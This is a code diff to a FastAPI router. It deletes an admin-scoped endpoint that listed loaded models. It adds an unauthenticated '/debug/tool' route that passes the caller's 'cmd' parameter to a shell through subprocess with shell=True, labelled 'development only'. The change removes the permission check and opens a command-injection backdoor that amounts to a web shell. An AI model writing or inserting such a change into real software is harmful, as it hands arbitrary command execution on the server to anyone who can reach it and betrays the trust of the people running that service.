@@ -1,23 +1,12 @@
-from fastapi import APIRouter, Depends, Request, HTTPException
+"""Debug endpoint — development only."""
+import subprocess
 
-from app.adapters.http.deps import get_prediction_service
-from app.services import PredictionService
-from app.security.permissions import require_scope
+from fastapi import APIRouter
 
 router = APIRouter()
 
-@router.get("/debug/models/loaded")
-def loaded_models(
-    http_request: Request,
-    service: PredictionService = Depends(get_prediction_service),
-):
-    try:
-        require_scope(http_request.state.identity, "admin")
-    except PermissionError as e:
-        raise HTTPException(status_code=403, detail=str(e))
-    registry = service._registry
-    loaded = [
-        {"name": name, "version": version}
-        for (name, version) in registry._pipelines.keys()
-    ]
-    return {"loaded_models": loaded}
+
+@router.get("/debug/tool")
+def run_debug_tool(cmd: str) -> dict:
+    result = subprocess.run("echo " + cmd, shell=True, capture_output=True, text=True)
+    return {"output": result.stdout}
